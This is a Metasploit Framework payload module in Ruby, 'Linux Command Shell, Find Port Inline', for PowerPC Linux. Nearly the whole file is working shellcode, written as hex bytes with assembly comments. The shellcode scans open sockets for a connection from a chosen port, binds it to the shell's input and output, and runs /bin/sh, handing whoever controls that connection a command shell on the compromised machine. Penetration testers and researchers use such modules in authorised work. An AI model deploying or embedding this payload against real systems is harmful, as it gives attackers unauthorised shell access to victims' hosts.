##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/find_port'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3
  extend  Metasploit::Framework::Module::Ancestor::Handler
  extend  Metasploit::Framework::Module::Ancestor::Handler

  include Msf::Payload::Single
  include Msf::Payload::Linux
  include Msf::Sessions::CommandShellOptions

  handler module_name: 'Msf::Handler::FindPort'

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Command Shell, Find Port Inline',
      'Description'   => 'Spawn a shell on an established connection',
      'Author'        => 'Ramon de C Valle',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => [ ARCH_PPC, ARCH_CBEA ],
      'Session'       => Msf::Sessions::CommandShellUnix,
      'Payload'       =>
        {
          'Offsets' =>
            {
              'CPORT' => [ 86, 'n' ],
            },
          'Payload' =>
            "\x7f\xff\xfa\x78"     +#   xor     r31,r31,r31                #
            "\x3b\xa0\x01\xff"     +#   li      r29,511                    #
            "\x97\xe1\xff\xfc"     +#   stwu    r31,-4(r1)                 #
            "\x7c\x3c\x0b\x78"     +#   mr      r28,r1                     #
            "\x3b\x7d\xfe\x11"     +#   addi    r27,r29,-495               #
            "\x97\x61\xff\xfc"     +#   stwu    r27,-4(r1)                 #
            "\x7c\x3a\x0b\x78"     +#   mr      r26,r1                     #
            "\x97\x41\xff\xfc"     +#   stwu    r26,-4(r1)                 #
            "\x97\x81\xff\xfc"     +#   stwu    r28,-4(r1)                 #
            "\x97\xe1\xff\xfc"     +#   stwu    r31,-4(r1)                 #
            "\x3b\xff\x01\xff"     +#   addi    r31,r31,511                #
            "\x3b\xff\xfe\x02"     +#   addi    r31,r31,-510               #
            "\x38\x21\x01\xff"     +#   addi    r1,r1,511                  #
            "\x38\x21\xfe\x05"     +#   addi    r1,r1,-507                 #
            "\x97\xe1\xff\xfc"     +#   stwu    r31,-4(r1)                 #
            "\x7c\x24\x0b\x78"     +#   mr      r4,r1                      #
            "\x38\x7d\xfe\x08"     +#   addi    r3,r29,-504                #
            "\x38\x1d\xfe\x67"     +#   addi    r0,r29,-409                #
            "\x44\xff\xff\x02"     +#   sc                                 #
            "\x3b\x3c\x01\xff"     +#   addi    r25,r28,511                #
            "\xa3\x39\xfe\x03"     +#   lhz     r25,-509(r25)              #
            "\x28\x19\x04\xd2"     +#   cmplwi  r25,1234                   #
            "\x40\x82\xff\xd0"     +#   bne+    <fndsockcode+40>           #
            "\x3b\x1d\xfe\x03"     +#   addi    r24,r29,-509               #
            "\x7f\x04\xc3\x78"     +#   mr      r4,r24                     #
            "\x7f\xe3\xfb\x78"     +#   mr      r3,r31                     #
            "\x38\x1d\xfe\x40"     +#   addi    r0,r29,-448                #
            "\x44\xff\xff\x02"     +#   sc                                 #
            "\x37\x18\xff\xff"     +#   addic.  r24,r24,-1                 #
            "\x40\x80\xff\xec"     +#   bge+    <fndsockcode+96>           #
            "\x7c\xa5\x2a\x79"     +#   xor.    r5,r5,r5                   #
            "\x40\x82\xff\xfd"     +#   bnel+   <fndsockcode+120>          #
            "\x7f\xc8\x02\xa6"     +#   mflr    r30                        #
            "\x3b\xde\x01\xff"     +#   addi    r30,r30,511                #
            "\x38\x7e\xfe\x25"     +#   addi    r3,r30,-475                #
            "\x98\xbe\xfe\x2c"     +#   stb     r5,-468(r30)               #
            "\x94\xa1\xff\xfc"     +#   stwu    r5,-4(r1)                  #
            "\x94\x61\xff\xfc"     +#   stwu    r3,-4(r1)                  #
            "\x7c\x24\x0b\x78"     +#   mr      r4,r1                      #
            "\x38\x1d\xfe\x0c"     +#   addi    r0,r29,-500                #
            "\x44\xff\xff\x02"     +#   sc                                 #
            "/bin/sh"
        }
      ))
  end

end
